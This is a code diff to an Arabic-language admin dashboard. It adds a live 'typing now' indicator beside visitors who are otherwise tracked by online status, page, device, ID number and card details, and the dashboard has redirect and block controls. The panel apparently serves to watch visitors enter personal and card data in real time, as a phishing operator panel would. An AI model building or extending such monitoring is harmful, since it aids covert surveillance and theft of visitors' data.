@@ -147,6 +147,7 @@
                     <span class="bg-red-600 text-white text-xs px-3 py-1 rounded cursor-pointer hover:bg-red-700 transition">
                         حظر <i class="fa-solid fa-ban mr-1"></i>
                     </span>
+                    <span id="detail-typing" class="hidden bg-orange-50 text-orange-600 border border-orange-200 text-xs px-3 py-1 rounded font-bold">✎ يكتب الآن</span>
                     <span id="detail-page" class="bg-blue-50 text-blue-700 border border-blue-200 text-xs px-3 py-1 rounded font-bold">—</span>
                     <select id="page-redirect" onchange="if(this.value){window.open(this.value,'_blank');this.selectedIndex=0;}" class="border border-green-500 text-green-600 text-xs px-2 py-1 rounded bg-white cursor-pointer hover:bg-green-50 transition font-bold">
                         <option value="">إعادة توجيه إلى صفحة…</option>
@@ -207,6 +208,7 @@
 
     <!-- Supabase data layer: realtime (WS events) + silent 30s polling, no page reload -->
 <!-- Supabase data layer: instant online/offline + live typing + page tracking -->
+<!-- Supabase data layer: instant online/offline + typing badge + page tracking -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.min.js"></script>
 <script>
 // ---------------------------------------------------------------------------
@@ -396,6 +398,7 @@ function mapVisitor(row) {
         createdAt: row.created_at,
         lastSeen: row.last_seen,
         isOnlineFlag: row.is_online !== false,
+        typing: row.is_typing === true,
         page: row.page || '',
         online: false
     };
@@ -464,6 +467,7 @@ function renderUsersList() {
                     <div class="mt-0.5 text-[10px] text-gray-400 flex items-center gap-1">
                         <i class="fa-solid fa-location-dot"></i> يتواجد في: ${pageLabel(user.page)}
                     </div>
+                    ${user.typing && user.online ? `<div class="mt-0.5 text-[10px] text-orange-600 font-bold"><i class="fa-solid fa-pen fa-fade"></i> يكتب الآن</div>` : ''}
                     ${isSelected ? `<div class="mt-1 flex items-center gap-2 text-xs text-gray-500">
                         <span><i class="fa-solid fa-mobile-screen"></i> ${user.deviceInfo || ''}</span>
                     </div>` : ''}
@@ -520,6 +524,8 @@ function selectUser(id) {
     document.getElementById('detail-id').innerText = user.idNumber;
     const pageEl = document.getElementById('detail-page');
     if (pageEl) pageEl.innerHTML = '<i class="fa-solid fa-location-dot"></i> يتواجد في: ' + pageLabel(user.page);
+    const typingEl = document.getElementById('detail-typing');
+    if (typingEl) typingEl.classList.toggle('hidden', !(user.typing && user.online));
 
     document.getElementById('card-name').innerText = user.name;
     document.getElementById('card-id').innerText = user.idNumber;
